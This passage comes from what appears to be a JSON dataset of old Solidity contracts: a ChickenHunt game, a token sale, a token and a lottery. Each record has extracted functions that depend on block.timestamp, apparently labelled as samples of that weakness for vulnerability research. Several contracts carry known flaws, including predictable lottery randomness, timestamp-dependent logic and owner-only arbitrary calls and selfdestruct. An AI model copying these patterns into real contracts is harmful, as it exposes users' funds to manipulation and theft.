_house.defensePower.add(_pet.defensePower * _amount);\n emit UpgradePet(msg.sender, _id, _house.pets[_id]);\n }\n function buyItem(uint256 _id) external payable {\n Item storage _item = items[_id];\n address _from = _item.owner;\n uint256 _price = _item.cost.mul(INCREMENT_RATE) / 10;\n _payEthereum(_price);\n saveChickenOf(_from);\n House storage _fromHouse = _houseOf(_from);\n _fromHouse.huntingMultiplier = _fromHouse.huntingMultiplier.sub(_item.huntingMultiplier);\n _fromHouse.offenseMultiplier = _fromHouse.offenseMultiplier.sub(_item.offenseMultiplier);\n _fromHouse.defenseMultiplier = _fromHouse.defenseMultiplier.sub(_item.defenseMultiplier);\n saveChickenOf(msg.sender);\n House storage _toHouse = _houseOf(msg.sender);\n _toHouse.huntingMultiplier = _toHouse.huntingMultiplier.add(_item.huntingMultiplier);\n _toHouse.offenseMultiplier = _toHouse.offenseMultiplier.add(_item.offenseMultiplier);\n _toHouse.defenseMultiplier = _toHouse.defenseMultiplier.add(_item.defenseMultiplier);\n uint256 _halfMargin = _price.sub(_item.cost) / 2;\n devFee = devFee.add(_halfMargin);\n ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin);\n items[_id].cost = _price;\n items[_id].owner = msg.sender;\n emit BuyItem(_from, msg.sender, _id, _price);\n }\n function buyStore() external payable {\n address _from = store.owner;\n uint256 _price = store.cost.mul(INCREMENT_RATE) / 10;\n _payEthereum(_price);\n uint256 _halfMargin = (_price - store.cost) / 2;\n devFee = devFee.add(_halfMargin);\n ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin).add(store.balance);\n store.cost = _price;\n store.owner = msg.sender;\n delete store.balance;\n emit BuyStore(_from, msg.sender, _price);\n }\n function withdrawStoreBalance() public {\n ethereumBalance[store.owner] = ethereumBalance[store.owner].add(store.balance);\n delete store.balance;\n }\n}\ncontract CHArena is CHHouse {\n event Attack(\n address indexed attacker,\n address indexed defender,\n uint256 booty\n );\n mapping(address => uint256) public attackCooldown;\n uint256 public cooldownTime;\n function attack(address _target) external {\n require(attackCooldown[msg.sender] < block.timestamp);\n House storage _attacker = houses[msg.sender];\n House storage _defender = houses[_target];\n if (_attacker.offensePower.mul(_attacker.offenseMultiplier)\n > _defender.defensePower.mul(_defender.defenseMultiplier)) {\n uint256 _chicken = saveChickenOf(_target);\n _chicken = _defender.depots > 0 ? _chicken / _defender.depots : _chicken;\n savedChickenOf[_target] = savedChickenOf[_target] - _chicken;\n savedChickenOf[msg.sender] = savedChickenOf[msg.sender].add(_chicken);\n attackCooldown[msg.sender] = block.timestamp + cooldownTime;\n emit Attack(msg.sender, _target, _chicken);\n }\n }\n}\ncontract CHAltar is CHArena {\n event NewAltarRecord(uint256 id, uint256 ethereum);\n event ChickenToAltar(address indexed user, uint256 id, uint256 chicken);\n event EthereumFromAltar(address indexed user, uint256 id, uint256 ethereum);\n struct AltarRecord {\n uint256 ethereum;\n uint256 chicken;\n }\n struct TradeBook {\n uint256 altarRecordId;\n uint256 chicken;\n }\n uint256 public genesis;\n mapping (uint256 => AltarRecord) public altarRecords;\n mapping (address => TradeBook) public tradeBooks;\n function chickenToAltar(uint256 _chicken) external {\n require(_chicken > 0);\n _payChicken(msg.sender, _chicken);\n uint256 _id = _getCurrentAltarRecordId();\n AltarRecord storage _altarRecord = _getAltarRecord(_id);\n require(_altarRecord.ethereum * _chicken / _chicken == _altarRecord.ethereum);\n TradeBook storage _tradeBook = tradeBooks[msg.sender];\n if (_tradeBook.altarRecordId < _id) {\n _resolveTradeBook(_tradeBook);\n _tradeBook.altarRecordId = _id;\n }\n _altarRecord.chicken = _altarRecord.chicken.add(_chicken);\n _tradeBook.chicken += _chicken;\n emit ChickenToAltar(msg.sender, _id, _chicken);\n }\n function ethereumFromAltar() external {\n uint256 _id = _getCurrentAltarRecordId();\n TradeBook storage _tradeBook = tradeBooks[msg.sender];\n require(_tradeBook.altarRecordId < _id);\n _resolveTradeBook(_tradeBook);\n }\n function tradeBookOf(address _user)\n public\n view\n returns (\n uint256 _id,\n uint256 _ethereum,\n uint256 _totalChicken,\n uint256 _chicken,\n uint256 _income\n )\n {\n TradeBook memory _tradeBook = tradeBooks[_user];\n _id = _tradeBook.altarRecordId;\n _chicken = _tradeBook.chicken;\n AltarRecord memory _altarRecord = altarRecords[_id];\n _totalChicken = _altarRecord.chicken;\n _ethereum = _altarRecord.ethereum;\n _income = _totalChicken > 0 ? _ethereum.mul(_chicken) / _totalChicken : 0;\n }\n function _resolveTradeBook(TradeBook storage _tradeBook) internal {\n if (_tradeBook.chicken > 0) {\n AltarRecord memory _oldAltarRecord = altarRecords[_tradeBook.altarRecordId];\n uint256 _ethereum = _oldAltarRecord.ethereum.mul(_tradeBook.chicken) / _oldAltarRecord.chicken;\n delete _tradeBook.chicken;\n ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_ethereum);\n emit EthereumFromAltar(msg.sender, _tradeBook.altarRecordId, _ethereum);\n }\n }\n function _getCurrentAltarRecordId() internal view returns (uint256) {\n return (block.timestamp - genesis) / 86400;\n }\n function _getAltarRecord(uint256 _id) internal returns (AltarRecord storage _altarRecord) {\n _altarRecord = altarRecords[_id];\n if (_altarRecord.ethereum == 0) {\n uint256 _ethereum = altarFund / 10;\n _altarRecord.ethereum = _ethereum;\n altarFund -= _ethereum;\n emit NewAltarRecord(_id, _ethereum);\n }\n }\n}\ncontract CHCommittee is CHAltar {\n event NewPet(\n uint256 id,\n uint256 huntingPower,\n uint256 offensePower,\n uint256 defense,\n uint256 chicken,\n uint256 ethereum,\n uint256 max\n );\n event ChangePet(\n uint256 id,\n uint256 chicken,\n uint256 ethereum,\n uint256 max\n );\n event NewItem(\n uint256 id,\n uint256 huntingMultiplier,\n uint256 offenseMultiplier,\n uint256 defenseMultiplier,\n uint256 ethereum\n );\n event SetDepot(uint256 ethereum, uint256 max);\n event SetConfiguration(\n uint256 chickenA,\n uint256 ethereumA,\n uint256 maxA,\n uint256 chickenB,\n uint256 ethereumB,\n uint256 maxB\n );\n event SetDistribution(\n uint256 dividendRate,\n uint256 altarCut,\n uint256 storeCut,\n uint256 devCut\n );\n event SetCooldownTime(uint256 cooldownTime);\n event SetNameAndSymbol(string name, string symbol);\n event SetDeveloper(address developer);\n event SetCommittee(address committee);\n address public committee;\n address public developer;\n function callFor(address _to, uint256 _value, uint256 _gas, bytes _code)\n external\n payable\n onlyCommittee\n returns (bool)\n {\n return _to.call.value(_value).gas(_gas)(_code);\n }\n function addPet(\n uint256 _huntingPower,\n uint256 _offensePower,\n uint256 _defense,\n uint256 _chicken,\n uint256 _ethereum,\n uint256 _max\n )\n public\n onlyCommittee\n {\n require(_max > 0);\n require(_max == uint256(uint32(_max)));\n uint256 _newLength = pets.push(\n Pet(_huntingPower, _offensePower, _defense, _chicken, _ethereum, _max)\n );\n emit NewPet(\n _newLength - 1,\n _huntingPower,\n _offensePower,\n _defense,\n _chicken,\n _ethereum,\n _max\n );\n }\n function changePet(\n uint256 _id,\n uint256 _chicken,\n uint256 _ethereum,\n uint256 _max\n )\n public\n onlyCommittee\n {\n require(_id < pets.length);\n Pet storage _pet = pets[_id];\n require(_max >= _pet.max && _max == uint256(uint32(_max)));\n _pet.chicken = _chicken;\n _pet.ethereum = _ethereum;\n _pet.max = _max;\n emit ChangePet(_id, _chicken, _ethereum, _max);\n }\n function addItem(\n uint256 _huntingMultiplier,\n uint256 _offenseMultiplier,\n uint256 _defenseMultiplier,\n uint256 _price\n )\n public\n onlyCommittee\n {\n uint256 _cap = 1 << 16;\n require(\n _huntingMultiplier < _cap &&\n _offenseMultiplier < _cap &&\n _defenseMultiplier < _cap\n );\n saveChickenOf(committee);\n House storage _house = _houseOf(committee);\n _house.huntingMultiplier = _house.huntingMultiplier.add(_huntingMultiplier);\n _house.offenseMultiplier = _house.offenseMultiplier.add(_offenseMultiplier);\n _house.defenseMultiplier = _house.defenseMultiplier.add(_defenseMultiplier);\n uint256 _newLength = items.push(\n Item(\n committee,\n _huntingMultiplier,\n _offenseMultiplier,\n _defenseMultiplier,\n _price\n )\n );\n emit NewItem(\n _newLength - 1,\n _huntingMultiplier,\n _offenseMultiplier,\n _defenseMultiplier,\n _price\n );\n }\n function setDepot(uint256 _price, uint256 _max) public onlyCommittee {\n require(_max >= depot.max);\n depot.ethereum = _price;\n depot.max = _max;\n emit SetDepot(_price, _max);\n }\n function setConfiguration(\n uint256 _chickenA,\n uint256 _ethereumA,\n uint256 _maxA,\n uint256 _chickenB,\n uint256 _ethereumB,\n uint256 _maxB\n )\n public\n onlyCommittee\n {\n require(_maxA >= typeA.max && (_maxA == uint256(uint32(_maxA))));\n require(_maxB >= typeB.max && (_maxB == uint256(uint32(_maxB))));\n typeA.chicken = _chickenA;\n typeA.ethereum = _ethereumA;\n typeA.max = _maxA;\n typeB.chicken = _chickenB;\n typeB.ethereum = _ethereumB;\n typeB.max = _maxB;\n emit SetConfiguration(_chickenA, _ethereumA, _maxA, _chickenB, _ethereumB, _maxB);\n }\n function setDistribution(\n uint256 _dividendRate,\n uint256 _altarCut,\n uint256 _storeCut,\n uint256 _devCut\n )\n public\n onlyCommittee\n {\n require(_storeCut > 0);\n require(\n _dividendRate.add(_altarCut).add(_storeCut).add(_devCut) == 100\n );\n dividendRate = _dividendRate;\n altarCut = _altarCut;\n store.cut = _storeCut;\n devCut = _devCut;\n emit SetDistribution(_dividendRate, _altarCut, _storeCut, _devCut);\n }\n function setCooldownTime(uint256 _cooldownTime) public onlyCommittee {\n cooldownTime = _cooldownTime;\n emit SetCooldownTime(_cooldownTime);\n }\n function setNameAndSymbol(string _name, string _symbol)\n public\n onlyCommittee\n {\n name = _name;\n symbol = _symbol;\n emit SetNameAndSymbol(_name, _symbol);\n }\n function setDeveloper(address _developer) public onlyCommittee {\n require(_developer != address(0));\n withdrawDevFee();\n developer = _developer;\n emit SetDeveloper(_developer);\n }\n function setCommittee(address _committee) public onlyCommittee {\n require(_committee != address(0));\n committee = _committee;\n emit SetCommittee(_committee);\n }\n function withdrawDevFee() public {\n ethereumBalance[developer] = ethereumBalance[developer].add(devFee);\n delete devFee;\n }\n modifier onlyCommittee {\n require(msg.sender == committee);\n _;\n }\n}\ncontract ChickenHunt is CHCommittee {\n event Join(address user);\n constructor() public {\n committee = msg.sender;\n developer = msg.sender;\n }\n function init(address _chickenTokenDelegator) external onlyCommittee {\n require(chickenTokenDelegator == address(0));\n chickenTokenDelegator = _chickenTokenDelegator;\n genesis = 1525791600;\n join();\n store.owner = msg.sender;\n store.cost = 0.1 ether;\n setConfiguration(100, 0.00001 ether, 99, 100000, 0.001 ether, 9);\n setDistribution(20, 75, 1, 4);\n setCooldownTime(600);\n setDepot(0.05 ether, 9);\n addItem(5, 5, 0, 0.01 ether);\n addItem(0, 0, 5, 0.01 ether);\n addPet(1000, 0, 0, 100000, 0.01 ether, 9);\n addPet(0, 1000, 0, 100000, 0.01 ether, 9);\n addPet(0, 0, 1000, 202500, 0.01 ether, 9);\n }\n function withdraw() external {\n uint256 _ethereum = ethereumBalance[msg.sender];\n delete ethereumBalance[msg.sender];\n msg.sender.transfer(_ethereum);\n }\n function join() public {\n House storage _house = houses[msg.sender];\n require(_house.depots == 0);\n _house.hunter = Hunter(1, 1, 1, 1);\n _house.depots = 1;\n _house.huntingPower = 10;\n _house.offensePower = 10;\n _house.defensePower = 110;\n _house.huntingMultiplier = 10;\n _house.offenseMultiplier = 10;\n _house.defenseMultiplier = 10;\n lastSaveTime[msg.sender] = block.timestamp;\n emit Join(msg.sender);\n }\n function hunterOf(address _user)\n public\n view\n returns (\n uint256 _strength,\n uint256 _dexterity,\n uint256 _constitution,\n uint256 _resistance\n )\n {\n Hunter memory _hunter = houses[_user].hunter;\n return (\n _hunter.strength,\n _hunter.dexterity,\n _hunter.constitution,\n _hunter.resistance\n );\n }\n function detailsOf(address _user)\n public\n view\n returns (\n uint256[2] _hunting,\n uint256[2] _offense,\n uint256[2] _defense,\n uint256[4] _hunter,\n uint256[] _pets,\n uint256 _depots,\n uint256 _savedChicken,\n uint256 _lastSaveTime,\n uint256 _cooldown\n )\n {\n House memory _house = houses[_user];\n _hunting = [_house.huntingPower, _house.huntingMultiplier];\n _offense = [_house.offensePower, _house.offenseMultiplier];\n _defense = [_house.defensePower, _house.defenseMultiplier];\n _hunter = [\n _house.hunter.strength,\n _house.hunter.dexterity,\n _house.hunter.constitution,\n _house.hunter.resistance\n ];\n _pets = _house.pets;\n _depots = _house.depots;\n _savedChicken = savedChickenOf[_user];\n _lastSaveTime = lastSaveTime[_user];\n _cooldown = attackCooldown[_user];\n }\n}",
  "extract_feature": [
    "function saveChickenOf(address _user) public returns (uint256) {\nuint256 _unclaimedChicken = _unclaimedChickenOf(_user);\ntotalChicken = totalChicken.add(_unclaimedChicken);\nuint256 _chicken = savedChickenOf[_user].add(_unclaimedChicken);\nsavedChickenOf[_user] = _chicken;\nlastSaveTime[_user] = block.timestamp;\nreturn _chicken;\n}",
    "function _payChicken(address _user, uint256 _chicken) internal {\nuint256 _unclaimedChicken = _unclaimedChickenOf(_user);\nuint256 _extraChicken;\nif (_chicken > _unclaimedChicken) {\n_extraChicken = _chicken - _unclaimedChicken;\nrequire(savedChickenOf[_user] >= _extraChicken);\nsavedChickenOf[_user] -= _extraChicken;\ntotalChicken -= _extraChicken;\n} else {\n_extraChicken = _unclaimedChicken - _chicken;\ntotalChicken = totalChicken.add(_extraChicken);\nsavedChickenOf[_user] += _extraChicken;\n}\nlastSaveTime[_user] = block.timestamp;\n}",
    "function _unclaimedChickenOf(address _user) internal view returns (uint256) {\nuint256 _timestamp = lastSaveTime[_user];\nif (_timestamp > 0 && _timestamp < block.timestamp) {\nreturn houses[_user].huntingPower.mul(\nhouses[_user].huntingMultiplier\n).mul(block.timestamp - _timestamp) / 100;\n} else {\nreturn 0;\n}\n}",
    "function attack(address _target) external {\nrequire(attackCooldown[msg.sender] < block.timestamp);\nHouse storage _attacker = houses[msg.sender];\nHouse storage _defender = houses[_target];\nif (_attacker.offensePower.mul(_attacker.offenseMultiplier)\n> _defender.defensePower.mul(_defender.defenseMultiplier)) {\nuint256 _chicken = saveChickenOf(_target);\n_chicken = _defender.depots > 0 ? _chicken / _defender.depots : _chicken;\nsavedChickenOf[_target] = savedChickenOf[_target] - _chicken;\nsavedChickenOf[msg.sender] = savedChickenOf[msg.sender].add(_chicken);\nattackCooldown[msg.sender] = block.timestamp + cooldownTime;\nemit Attack(msg.sender, _target, _chicken);\n}\n}",
    "function _getCurrentAltarRecordId() internal view returns (uint256) {\nreturn (block.timestamp - genesis) / 86400;\n}",
    "function join() public {\nHouse storage _house = houses[msg.sender];\nrequire(_house.depots == 0);\n_house.hunter = Hunter(1, 1, 1, 1);\n_house.depots = 1;\n_house.huntingPower = 10;\n_house.offensePower = 10;\n_house.defensePower = 110;\n_house.huntingMultiplier = 10;\n_house.offenseMultiplier = 10;\n_house.defenseMultiplier = 10;\nlastSaveTime[msg.sender] = block.timestamp;\nemit Join(msg.sender);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5c"
  },
  "filename": "8349.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Outer {\n Inner1 public myInner1 = new Inner1();\n function callSomeFunctionViaOuter() public {\n myInner1.callSomeFunctionViaInner1();\n }\n}\ncontract Inner1 {\n Inner2 public myInner2 = new Inner2();\n function callSomeFunctionViaInner1() public {\n myInner2.doSomething();\n }\n}\ncontract Inner2 {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n}",
  "extract_feature": [
    "function doSomething() public {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5d"
  },
  "filename": "8351.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Outer {\n Inner1 public myInner1 = new Inner1();\n function callSomeFunctionViaOuter() public {\n myInner1.callSomeFunctionViaInner1();\n }\n}\ncontract Inner1 {\n Inner2 public myInner2 = new Inner2();\n function callSomeFunctionViaInner1() public {\n myInner2.doSomething();\n }\n}\ncontract Inner2 {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n}",
  "extract_feature": [
    "function doSomething() public {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5e"
  },
  "filename": "8352.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Outer {\n Inner1 public myInner1 = new Inner1();\n function callSomeFunctionViaOuter() public {\n myInner1.callSomeFunctionViaInner1();\n }\n}\ncontract Inner1 {\n Inner2 public myInner2 = new Inner2();\n function callSomeFunctionViaInner1() public {\n myInner2.doSomething();\n }\n}\ncontract Inner2 {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n}",
  "extract_feature": [
    "function doSomething() public {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f5f"
  },
  "filename": "8436.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract TokenCHK {\n function balanceOf(address _owner) public pure returns (uint256 balance) {}\n}\ncontract ESSENTIA_PE is Ownable {\n using SafeMath for uint256;\n string public name = \"ESSENTIA Public Engagement\";\n uint256 public tokenPrice = 0;\n uint256 public maxCap = 0;\n address public FWDaddrETH;\n address public ESSgenesis;\n uint256 public totalSold;\n uint256 public decimals = 18;\n mapping (address => uint256) public sold;\n uint256 public pubEnd = 0;\n address contractAddr=this;\n uint256 public tokenUnit = uint256(10)**decimals;\n constructor\n (\n address toETHaddr,\n address addrESSgenesis\n ) public {\n FWDaddrETH = toETHaddr;\n ESSgenesis = addrESSgenesis;\n }\n function () public payable {\n buy();\n }\n function setFWDaddrETH(address _value) public onlyOwner{\n FWDaddrETH=_value;\n }\n function setGenesis(address _value) public onlyOwner{\n ESSgenesis=_value;\n }\n function setMaxCap(uint256 _value) public onlyOwner{\n maxCap=_value;\n }\n function setPrice(uint256 _value) public onlyOwner{\n tokenPrice=_value;\n }\n function setPubEnd(uint256 _value) public onlyOwner{\n pubEnd=_value;\n }\n function buy() public payable {\n require(block.timestamp < pubEnd);\n require(msg.value > 0);\n require(msg.value <= msg.sender.balance);\n require(msg.value + totalSold <= maxCap);\n uint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\n require(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\n transferBuy(msg.sender, tokenAmount);\n totalSold = totalSold.add(msg.value);\n FWDaddrETH.transfer(msg.value);\n }\n function withdrawPUB() public returns(bool){\n require(block.timestamp > pubEnd);\n require(sold[msg.sender] > 0);\n if(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\n delete sold[msg.sender];\n return true;\n }\n function transferBuy(address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n sold[_to]=sold[_to].add(_value);\n return true;\n }\n function EMGwithdraw(uint256 weiValue) external onlyOwner {\n require(block.timestamp > pubEnd);\n require(weiValue > 0);\n FWDaddrETH.transfer(weiValue);\n }\n}",
  "extract_feature": [
    "function buy() public payable {\nrequire(block.timestamp < pubEnd);\nrequire(msg.value > 0);\nrequire(msg.value <= msg.sender.balance);\nrequire(msg.value + totalSold <= maxCap);\nuint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\nrequire(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\ntransferBuy(msg.sender, tokenAmount);\ntotalSold = totalSold.add(msg.value);\nFWDaddrETH.transfer(msg.value);\n}",
    "function withdrawPUB() public returns(bool){\nrequire(block.timestamp > pubEnd);\nrequire(sold[msg.sender] > 0);\nif(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\ndelete sold[msg.sender];\nreturn true;\n}",
    "function EMGwithdraw(uint256 weiValue) external onlyOwner {\nrequire(block.timestamp > pubEnd);\nrequire(weiValue > 0);\nFWDaddrETH.transfer(weiValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f60"
  },
  "filename": "8497.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function transfer(address to, uint tokens) public returns (bool success);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n}\ncontract CryptoQuantumTradingFund is ERC20Interface {\n function totalSupply()public constant returns (uint) {\n return fixTotalBalance;\n }\n function balanceOf(address tokenOwner)public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function transfer(address to, uint tokens)public returns (bool success) {\n if (balances[msg.sender] >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {\n if(msg.sender == creatorsAddress)\n {\n TryUnLockCreatorBalance();\n if(balances[msg.sender] < (creatorsLocked + tokens))\n {\n return false;\n }\n }\n balances[msg.sender] -= tokens;\n balances[to] += tokens;\n emit Transfer(msg.sender, to, tokens);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint tokens)public returns (bool success) {\n if (balances[from] >= tokens && allowed[from][msg.sender] >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {\n if(from == creatorsAddress)\n {\n TryUnLockCreatorBalance();\n if(balances[from] < (creatorsLocked + tokens))\n {\n return false;\n }\n }\n balances[from] -= tokens;\n allowed[from][msg.sender] -= tokens;\n balances[to] += tokens;\n emit Transfer(from, to, tokens);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint tokens)public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n function allowance(address tokenOwner, address spender)public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n string public name = \"CryptoQuantumTradingFund\";\n string public symbol = \"CQTF\";\n uint8 public decimals = 18;\n uint256 private fixTotalBalance = 100000000000000000000000000;\n uint256 private _totalBalance = 92000000000000000000000000;\n uint256 public creatorsLocked = 8000000000000000000000000;\n address public owner = 0x0;\n mapping (address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n uint constant private ONE_DAY_TIME_LEN = 86400;\n uint constant private ONE_YEAR_TIME_LEN = 946080000;\n uint32 private constant MAX_UINT32 = 0xFFFFFFFF;\n address public creatorsAddress = 0xbcabf04377034e4eC3C20ACaD2CA093559Ee9742;\n uint public unLockIdx = 2;\n uint public nextUnLockTime = block.timestamp + ONE_YEAR_TIME_LEN;\n function CryptoQuantumTradingFund() public {\n owner = msg.sender;\n balances[creatorsAddress] = creatorsLocked;\n balances[owner] = _totalBalance;\n }\n function TryUnLockCreatorBalance() public {\n while(unLockIdx > 0 && block.timestamp >= nextUnLockTime){\n uint256 append = creatorsLocked/unLockIdx;\n creatorsLocked -= append;\n unLockIdx -= 1;\n nextUnLockTime = block.timestamp + ONE_YEAR_TIME_LEN;\n }\n }\n function () public payable\n {\n }\n function Save() public {\n if (msg.sender != owner) revert();\n owner.transfer(address(this).balance);\n }\n function changeOwner(address newOwner) public {\n if (msg.sender != owner)\n {\n revert();\n }\n else\n {\n owner = newOwner;\n }\n }\n function destruct() public {\n if (msg.sender != owner)\n {\n revert();\n }\n else\n {\n selfdestruct(owner);\n }\n }\n}",
  "extract_feature": [
    "function TryUnLockCreatorBalance() public {\nwhile(unLockIdx > 0 && block.timestamp >= nextUnLockTime){\nuint256 append = creatorsLocked/unLockIdx;\ncreatorsLocked -= append;\nunLockIdx -= 1;\nnextUnLockTime = block.timestamp + ONE_YEAR_TIME_LEN;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f61"
  },
  "filename": "8502.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Lottery{\n modifier onlyOwner()\n {\n require(msg.sender == owner);\n _;\n }\n modifier notPooh(address aContract)\n {\n require(aContract != address(poohContract));\n _;\n }\n modifier isOpenToPublic()\n {\n require(openToPublic);\n _;\n }\n modifier onlyHuman()\n {\n require (msg.sender == tx.origin);\n _;\n }\n event Deposit(\n uint256 amount,\n address depositer\n );\n event WinnerPaid(\n uint256 amount,\n address winner\n );\n POOH poohContract;\n address owner;\n bool openToPublic = false;\n uint256 ticketNumber = 0;\n uint256 winningNumber;\n constructor() public\n {\n poohContract = POOH(0x4C29d75cc423E8Adaa3839892feb66977e295829);\n openToPublic = false;\n owner = msg.sender;\n }\n function() payable public { }\n function deposit()\n isOpenToPublic()\n onlyHuman()\n payable public\n {\n require(msg.value >= 1000000000000000);\n address customerAddress = msg.sender;\n poohContract.buy.value(msg.value)(customerAddress);\n emit Deposit(msg.value, msg.sender);\n if(msg.value > 1000000000000000)\n {\n uint extraTickets = SafeMath.div(msg.value, 1000000000000000);\n ticketNumber += extraTickets;\n }\n if(ticketNumber >= winningNumber)\n {\n poohContract.exit();\n payDev(owner);\n payWinner(customerAddress);\n poohContract.buy.value(address(this).balance)(customerAddress);\n resetLottery();\n }\n else\n {\n ticketNumber++;\n }\n }\n function myTokens() public view returns(uint256)\n {\n return poohContract.myTokens();\n }\n function myDividends() public view returns(uint256)\n {\n return poohContract.myDividends(true);\n }\n function ethBalance() public view returns (uint256)\n {\n return address(this).balance;\n }\n function openToThePublic()\n onlyOwner()\n public\n {\n openToPublic = true;\n resetLottery();\n }\n function returnAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\n public\n onlyOwner()\n notPooh(tokenAddress)\n returns (bool success)\n {\n return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n }\n function payWinner(address winner) internal\n {\n uint balance = SafeMath.sub(address(this).balance, 50000000000000000);\n winner.transfer(balance);\n emit WinnerPaid(balance, winner);\n }\n function payDev(address dev) internal\n {\n uint balance = SafeMath.div(address(this).balance, 10);\n dev.transfer(balance);\n }\n function resetLottery() internal\n isOpenToPublic()\n {\n ticketNumber = 1;\n winningNumber = uint256(keccak256(block.timestamp, block.difficulty))%300;\n }\n}\ncontract ERC20Interface\n{\n function transfer(address to, uint256 tokens) public returns (bool success);\n}\ncontract POOH\n{\n function buy(address) public payable returns(uint256);\n function exit() public;\n function myTokens() public view returns(uint256);\n function myDividends(bool) public view returns(uint256);\n}\nlibrary SafeMath {\n function div(uint256 a, uint256 b) internal pure returns (uint256)\n {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n}",
  "extract_feature": [
    "function() payable public { }\nfunction deposit()\nisOpenToPublic()\nonlyHuman()\npayable public\n{\nrequire(msg.value >= 1000000000000000);\naddress customerAddress = msg.sender;\npoohContract.buy.value(msg.value)(customerAddress);\nemit Deposit(msg.value, msg.sender);\nif(msg.value > 1000000000000000)\n{\nuint extraTickets = SafeMath.div(msg.value, 1000000000000000);\nticketNumber += extraTickets;\n}\nif(ticketNumber >= winningNumber)\n{\npoohContract.exit();\npayDev(owner);\npayWinner(customerAddress);\npoohContract.buy.value(address(this).balance)(customerAddress);\nresetLottery();\n}\nelse\n{\nticketNumber++;\n}\n}\nfunction myTokens() public view returns(uint256)\n{\nreturn poohContract.myTokens();\n}\nfunction myDividends() public view returns(uint256)\n{\nreturn poohContract.myDividends(true);\n}\nfunction ethBalance() public view returns (uint256)\n{\nreturn address(this).balance;\n}\nfunction openToThePublic()\nonlyOwner()\npublic\n{\nopenToPublic = true;\nresetLottery();\n}\nfunction returnAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nnotPooh(tokenAddress)\nreturns (bool success)\n{\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\nfunction payWinner(address winner) internal\n{\nuint balance = SafeMath.sub(address(this).balance, 50000000000000000);\nwinner.transfer(balance);\nemit WinnerPaid(balance, winner);\n}\nfunction payDev(address dev) internal\n{\nuint balance = SafeMath.div(address(this).balance, 10);\ndev.transfer(balance);\n}\nfunction resetLottery() internal\nisOpenToPublic()\n{\nticketNumber = 1;\nwinningNumber = uint256(keccak256(block.timestamp, block.difficulty))%300;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f62"
  },
  "filename": "8505.sol",
